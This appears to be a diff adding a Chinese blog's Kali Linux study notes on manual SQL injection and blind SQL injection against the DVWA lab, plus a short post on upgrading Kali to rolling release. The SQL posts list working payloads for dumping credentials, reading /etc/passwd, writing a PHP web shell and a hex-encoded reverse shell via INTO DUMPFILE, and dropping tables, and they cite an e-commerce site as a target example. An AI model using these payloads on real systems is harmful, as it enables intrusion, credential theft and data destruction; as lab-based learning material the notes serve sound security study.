@@ -240,6 +240,702 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/" itemprop="url">Kali Linux笔记(五十)：手动漏洞挖掘--SQL盲注</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:12:46+08:00">
+                2020-01-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-判断技术"><a href="#1-判断技术" class="headerlink" title="1. 判断技术"></a>1. 判断技术</h4><ul>
+<li>不显示数据库内建的报错信息<ul>
+<li>内建的报错信息帮助开发人员发现和修复问题</li>
+<li>报错信息提供关于系统的大量有用信息</li>
+</ul>
+</li>
+<li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即为盲注</li>
+<li>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断<ul>
+<li>1’ and 1=1–+</li>
+<li>1’ and 1=2–+</li>
+<li>1’ order by 5–+  假</li>
+<li>1’ order by 2–+  真</li>
+<li>1’ union select 1,2–+</li>
+<li>1’ union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())–+</li>
+<li>1’ and 1=0 union select null,table_name from information_schema.tables#</li>
+<li>1’ and 1=0 union selcet null,table_name from information_schema.colums where table_name=’users’#</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-猜字段–无information-scheme"><a href="#2-猜字段–无information-scheme" class="headerlink" title="2. 猜字段–无information_scheme"></a>2. 猜字段–无information_scheme</h4><ul>
+<li>无权读取information_shcema库/拒绝union、order by语句<ul>
+<li>猜列名：1’ and user is not null–+</li>
+<li>猜当前表名：1’ and table.user is not null–+</li>
+<li>猜库里其他表：1’ and (select count() from table)&gt;0–+</li>
+<li>列表对应关系：1’ and users.user is not null–+</li>
+<li>猜字段内容：1’ and user=’admin’/1’ or user like ‘%a’</li>
+<li>猜账号对应密码：2’ or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99</li>
+<li>▲ Burpsuite自动化猜解内容</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-真实实例"><a href="#3-真实实例" class="headerlink" title="3. 真实实例"></a>3. 真实实例</h4><ul>
+<li>开个脑洞<ul>
+<li>真实案例：某电商网站</li>
+<li><a href="http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123</a></li>
+<li>and 1=1–+  显示一包面巾纸</li>
+<li>and 1-2–+  显示一袋洗衣粉</li>
+<li>1’ and ORD(MID((VERSION()),1,1))&amp;（1/2/4/8/16/32/64/128）&gt;0–+</li>
+<li>CURRENT_USER()、DATABASE()</li>
+<li>MID用法：MID(ColumnName,Start [,Length])</li>
+<li>ORD用法：ORD(string)   #ASCII码</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-DVWA的SQL盲注源码"><a href="#4-DVWA的SQL盲注源码" class="headerlink" title="4. DVWA的SQL盲注源码"></a>4. DVWA的SQL盲注源码</h4><ul>
+<li>DVWA的SQL Injection(Blind) Source（Low）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的SQL Injection(Blind) Source（Medium）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line">    </span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first=mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last=mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的SQL Injection(Blind) Source（High）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id)) &#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">        $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/" itemprop="url">Kali Linux笔记(四十八)：Kali Linux版本更新--rolling</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:35+08:00">
+                2020-01-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Kali-Linux版本更新–第一个Rolling-RELEASE"><a href="#1-Kali-Linux版本更新–第一个Rolling-RELEASE" class="headerlink" title="1. Kali Linux版本更新–第一个Rolling RELEASE"></a>1. Kali Linux版本更新–第一个Rolling RELEASE</h4><ul>
+<li>Kali 2.0发布时声称将采用rolling release模式更新（但并未实施）</li>
+<li>Fixed-release<ul>
+<li>固定发布周期</li>
+<li>使用软件稳定的主流版本（发布–主流–作废）</li>
+<li>更稳定，适合于企业生成环境</li>
+</ul>
+</li>
+<li>Rolling release<ul>
+<li>适用于开发者和技术人员</li>
+<li>连续升级新版本，追求在新功能出现后最快使用</li>
+<li>正式成为流行</li>
+</ul>
+</li>
+<li>Kali 2.0 rolling release<ul>
+<li>采用debian testing库作为更新源</li>
+</ul>
+</li>
+<li>软件包追踪<ul>
+<li><a href="https://pkg.kali.org/" target="_blank" rel="noopener">https://pkg.kali.org/</a></li>
+</ul>
+</li>
+<li>VMware Tools vs Open-VM-Tools<ul>
+<li>apt-get install open-vm-tools-desktop fuse</li>
+</ul>
+</li>
+<li>Gnome 3.18</li>
+<li>4.3内核</li>
+<li>Kali 2.0现有版本升级</li>
+</ul>
+<blockquote>
+<pre><code>⭐现有版本更新
+cat &lt;&lt; EOF &gt; /etc/apt/sources.list
+deb http://http.kali.org/kali kali-rolling main non-free contrib
+EOF
+
+⭐安装命令
+apt-get update
+apt-get dist-upgrade 
+reboot
+
+⭐查看版本号，代码号
+lsb_release -a</code></pre></blockquote>
+<ul>
+<li>Kali sana库于2016年4月15日停止更新</li>
+<li>工具有所更新</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/" itemprop="url">Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:22+08:00">
+                2020-01-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-五种判断机制"><a href="#1-五种判断机制" class="headerlink" title="1. 五种判断机制"></a>1. 五种判断机制</h4><ul>
+<li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用）</li>
+<li>用户登录判断<ul>
+<li>SELECT * FROM users WHERE user=’uname’ AND password=’password’</li>
+<li>SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”</li>
+</ul>
+</li>
+<li>基于报错的检测方法（low）<ul>
+<li>‘ “ % ()</li>
+</ul>
+</li>
+<li>基于布尔的检测<ul>
+<li>1’ and ‘1’=’1 / 1’ and ‘1（真）</li>
+<li>1’ and ‘1’=’2 / 1’ and ‘0（假）</li>
+</ul>
+</li>
+<li>表列数/显示信息位于哪一列<ul>
+<li>‘order by 9–+（按查询列号排序）（注释符：–）</li>
+<li>select * 时表字段数=查询字段数</li>
+</ul>
+</li>
+<li>联合查询<ul>
+<li>‘union select 1,2–+ </li>
+<li>‘union all select database()/user()/version(),2– +</li>
+</ul>
+</li>
+<li>‘union select database(),substring index(USER(),”@”,1)–+（切分字段）</li>
+<li>DB用户：user() </li>
+<li>DB版本：version()</li>
+<li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li>
+<li>当前库：database()</li>
+<li>ASCII转字符：char()</li>
+<li>连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li>
+<li>计算哈希：md5()</li>
+<li>Mysql数据结构<ul>
+<li>information_schema</li>
+</ul>
+</li>
+<li>所有库所有表/统计每库中表的数量<ul>
+<li>‘union select table_name,table_schema from information_schema.tables–+</li>
+<li>‘union select table_schema,count(*) from information_schema.tables group by table_schema–+</li>
+</ul>
+</li>
+<li>Dvwa库中的表名<ul>
+<li>‘union select table_name,table_schema from information_schema.tables where table_schema=’dvwa’–+</li>
+</ul>
+</li>
+<li>Users表中的所有列（user_id,first_name,last_name,user,password,avatar）<ul>
+<li>‘union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’–+</li>
+</ul>
+</li>
+<li>查询user、password列的内容<ul>
+<li>‘union select users,password from dvwa,users–+</li>
+<li>‘union select users,password from users–+</li>
+<li>‘union select null,concat(user,0x3a,password) from users–+ </li>
+</ul>
+</li>
+</ul>
+<h4 id="2-密码猜测"><a href="#2-密码猜测" class="headerlink" title="2. 密码猜测"></a>2. 密码猜测</h4><ul>
+<li>hash-identifier<ul>
+<li>输入猜测的值</li>
+</ul>
+</li>
+<li>密码破解<ul>
+<li>username:passhash–&gt;dvwa.txt</li>
+<li>john –format=raw-MD5 dvwa.txt（存在./john文件）</li>
+</ul>
+</li>
+<li>显示之前破解的密码<ul>
+<li>john –format=raw-MD5 dvwa.txt –show</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-系统文件读取-命令执行"><a href="#3-系统文件读取-命令执行" class="headerlink" title="3. 系统文件读取/命令执行"></a>3. 系统文件读取/命令执行</h4><ul>
+<li>读取文件<ul>
+<li>‘union select null,load_file(‘/etc/passwd’)–+</li>
+</ul>
+</li>
+<li>写入文件（原文件形式）<ul>
+<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “a.php”–+（dumpfile到默认目录，默认目录只有mysql有权限）</li>
+<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “/var/www/a.php”–+（dumpfile到指定目录）</li>
+<li><ul>
+<li>▲ 脚本可以写到具有777权限的/tmp目录，结合SQL注入和File Inclusion达到作用</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>写入文件（十六进制模式）<ul>
+<li>cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</li>
+<li>cat php-reverse-shell.php | xxd -ps | tr -d ‘\n’（▲ 十六进制编码的shell）</li>
+<li>‘union select null,+(0x十六进制编码) INTO DUMPFILE ‘/tmp/x.php’–+</li>
+<li>可能受到服务器GET大小的限制，传输不成功</li>
+</ul>
+</li>
+<li>保存下载数据库<ul>
+<li>‘union select null,concat(user,0x3a,password) from users INTO OUTFILE ‘/tmp/a.db’–+</li>
+</ul>
+</li>
+<li>一个思路：编写服务器端代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name = $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username = $_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot; value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; --</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-猜字段–无information-schema"><a href="#4-猜字段–无information-schema" class="headerlink" title="4. 猜字段–无information_schema"></a>4. 猜字段–无information_schema</h4><ul>
+<li>无权读取information_schema库/拒绝union、order by语句<ul>
+<li>猜列名：’and column is null–+（Burpsuite自动猜列名）</li>
+<li>猜当前表表名：’and table.user is null–+</li>
+<li>猜库里其他表：’and (select count(*) from table)&gt;0–+</li>
+<li>列表对应关系：’and users.user is null–+</li>
+<li>猜字段内容：’or user=’admin/‘or user like ‘%a%</li>
+<li>猜账号对应密码：’or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99（MD5值）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐之前的SQL注入教程，主要是针对mysql的root权限，如果得到的是mysql的一个普通用户的权限，则很难通过information_schema来查询以及执行指令
+⭐查找column字典
+find / -name *column*.txt
+cat /usr/share/golismero/tools/sqlmap/txt/common-colums.txt | gerp -v ^# &gt; column.txt
+⭐查找table表名
+find / -name *.table*.txt
+cat /usr/share/golismero/tools/sqlmap/txt/common-table.txt | gerp -v ^# &gt;table.txt
+⭐MD5作为字典
+md5sum common-password.txt password.txt</code></pre></blockquote>
+<h4 id="5-用户注入–无information-schema"><a href="#5-用户注入–无information-schema" class="headerlink" title="5. 用户注入–无information_schema"></a>5. 用户注入–无information_schema</h4><ul>
+<li>‘;update users set user=’yuanfh’ where user=’admin’<ul>
+<li>注入失败，sql客户端工具的问题</li>
+<li><a href="http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</a></li>
+</ul>
+</li>
+<li>‘;INSERT into users(‘user_id’,’first_name’,’last_name’,’user’,’password’,’avatar’)VALUES(‘35’,’fh’,’yuan’,’yfh’,’5f4dcc3b5aa765d61d8327deb882cf99’,’OK’);–+</li>
+<li>‘;DROP TABLE users;–+</li>
+<li>xp_cmdshell /存储过程</li>
+<li>▲ SQLi没有通用的方法，掌握原理，了解各种数据库特性 </li>
+</ul>
+<h4 id="6-DVWA的SQL注入源码"><a href="#6-DVWA的SQL注入源码" class="headerlink" title="6. DVWA的SQL注入源码"></a>6. DVWA的SQL注入源码</h4><ul>
+<li>Dvwa的SQL Injection Source（Low）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa的SQL Injection Source（Medium）<ul>
+<li>对特殊字符的转义</li>
+<li>mysql_real_escape_srting()（PHP 4 &gt;=4.3.0，PHP5）</li>
+<li>PHP 5.5.0已经启用此函数</li>
+<li>PHP 7.0.0已经删除此函数，代之以MySQLi、PDO_M有、SQL</li>
